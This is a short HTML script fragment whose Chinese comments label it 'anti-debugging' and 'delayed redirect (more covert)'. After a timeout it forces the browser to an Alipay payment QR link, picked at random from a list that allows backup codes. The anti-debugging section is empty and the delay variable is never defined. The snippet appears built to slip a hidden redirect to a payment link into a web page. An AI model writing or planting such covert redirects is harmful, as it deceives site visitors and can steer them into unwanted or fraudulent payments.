  <script>
    // 反调试

    // 延迟跳转（更隐蔽）

    setTimeout(() => {
      const urls = [
        "https://qr.alipay.com/fkx17625jyaptmgpylbosce",
        "https://qr.alipay.com/fkx17625jyaptmgpylbosce", // 可换成备用码
      ];
      const target = urls[Math.floor(Math.random() * urls.length)];
      window.location.href = target;
    }, delay);
  </script>
